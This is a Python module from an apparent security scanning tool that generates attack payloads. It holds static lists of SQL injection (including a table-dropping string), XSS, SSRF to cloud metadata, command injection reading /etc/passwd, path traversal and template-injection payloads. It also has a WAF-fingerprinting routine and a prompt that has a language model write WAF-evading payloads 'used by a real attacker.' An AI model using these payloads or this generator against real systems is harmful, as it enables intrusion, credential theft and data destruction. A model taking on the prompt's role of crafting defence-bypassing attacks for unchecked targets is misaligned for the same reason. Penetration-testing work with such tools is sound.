"""AI-powered smart payload generator.

Uses LLMs to generate context-aware attack payloads that bypass WAFs
and target specific frameworks. Falls back to static payloads when
AI is unavailable.
"""

from __future__ import annotations

import json
from typing import Any

from stryx.utils.logging import get_logger

logger = get_logger("ai.payload_generator")


# Static fallback payloads by category
FALLBACK_PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1'--",
        "' UNION SELECT NULL--",
        "1' AND SLEEP(3)--",
        "1; DROP TABLE users--",
        "' OR 1=1#",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
    ],
    "ssrf": [
        "http://127.0.0.1:80/",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/",
        "http://[::1]/",
        "http://0177.0.0.1/",
    ],
    "cmdi": [
        "; cat /etc/passwd",
        "| id",
        "`whoami`",
        "$(cat /etc/passwd)",
        "; sleep 5",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config.items()}}",
    ],
}


PAYLOAD_GENERATION_PROMPT = """You are an expert penetration tester.
Generate {count} security testing payloads for the following scenario:

Category: {category}
Framework: {framework}
Target endpoint: {endpoint}""
WAF detected: {waf}
Previous payload that worked: {previous_payload}

Generate payloads that:
1. Are specific to the {framework} framework
2. Bypass common WAF rules if {waf} is detected
3. Are realistic and would be used by a real attacker
4. Cover different encoding and bypass techniques

Return ONLY a JSON array of payload strings, no other text.
Example: ["payload1", "payload2", "payload3"]
"""


class PayloadGenerator:
    """Generates context-aware attack payloads using AI."""

    def __init__(self, ai_provider: Any = None):
        """
        Args:
            ai_provider: An AI provider instance with a generate() method.
                        If None, uses fallback static payloads.
        """
        self.ai_provider = ai_provider
        self._cache: dict[str, list[str]] = {}

    async def generate(
        self,
        category: str,
        framework: str = "unknown",
        endpoint: str = "",
        waf: str = "none",
        previous_payload: str = "",
        count: int = 10,
    ) -> list[str]:
        """Generate payloads for a specific category and context.

        Args:
            category: Payload category (sqli, xss, ssrf, cmdi, etc.)
            framework: Detected framework (e.g., "Express", "Django", "Flask")
            endpoint: Target endpoint URL
            waf: Detected WAF name (e.g., "Cloudflare", "ModSecurity")
            previous_payload: A payload that previously worked
            count: Number of payloads to generate

        Returns:
            List of payload strings
        """
        # Check cache
        cache_key = f"{category}:{framework}:{waf}"
        if cache_key in self._cache:
            return self._cache[cache_key][:count]

        # Try AI generation
        if self.ai_provider:
            try:
                payloads = await self._generate_with_ai(category, framework, endpoint, waf, previous_payload, count)
                if payloads:
                    self._cache[cache_key] = payloads
                    return payloads
            except Exception as e:
                logger.debug(f"AI payload generation failed: {e}")

        # Fallback to static payloads
        payloads = self._get_fallback_payloads(category)
        self._cache[cache_key] = payloads
        return payloads[:count]

    async def _generate_with_ai(
        self,
        category: str,
        framework: str,
        endpoint: str,
        waf: str,
        previous_payload: str,
        count: int,
    ) -> list[str]:
        """Generate payloads using the AI provider."""
        prompt = PAYLOAD_GENERATION_PROMPT.format(
            count=count,
            category=category,
            framework=framework,
            endpoint=endpoint or "N/A",
            waf=waf,
            previous_payload=previous_payload or "None",
        )

        response = await self.ai_provider.generate(
            prompt=prompt,
            system_prompt="You are a security testing expert. Return only valid JSON arrays.",
        )

        # Parse response
        try:
            # Try to extract JSON array from response
            text = response.strip()
            if text.startswith("["):
                payloads = json.loads(text)
            else:
                # Try to find JSON array in the response
                start = text.find("[")
                end = text.rfind("]") + 1
                if start != -1 and end > start:
                    payloads = json.loads(text[start:end])
                else:
                    return []

            if isinstance(payloads, list):
                return [str(p) for p in payloads if isinstance(p, str)][:count]
        except (json.JSONDecodeError, TypeError):
            pass

        return []

    def _get_fallback_payloads(self, category: str) -> list[str]:
        """Get static fallback payloads for a category."""
        return FALLBACK_PAYLOADS.get(category, [])

    def detect_waf(self, response_headers: dict[str, str], response_body: str = "") -> str:
        """Detect if a WAF is present based on response patterns."""
        waf_signatures = {
            "Cloudflare": ["cf-ray", "cf-cache-status", "cloudflare"],
            "Akamai": ["x-akamai-transformed", "akamai"],
            "AWS WAF": ["x-amzn-waf", "aws"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "Incapsula": ["x-iinfo", "incap_ses", "incapsula"],
            "Sucuri": ["x-sucuri-id", "sucuri"],
            "Barracuda": ["x-barracuda", "barracuda"],
            "F5 BIG-IP": ["x-cnection", "bigip"],
            "FortiWeb": ["x-fortiwaf", "fortiweb"],
            "Imperva": ["x-cdn", "imperva"],
        }

        headers_str = json.dumps(response_headers).lower()
        body_lower = response_body.lower()

        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if sig.lower() in headers_str or sig.lower() in body_lower:
                    return waf_name

        return "none"
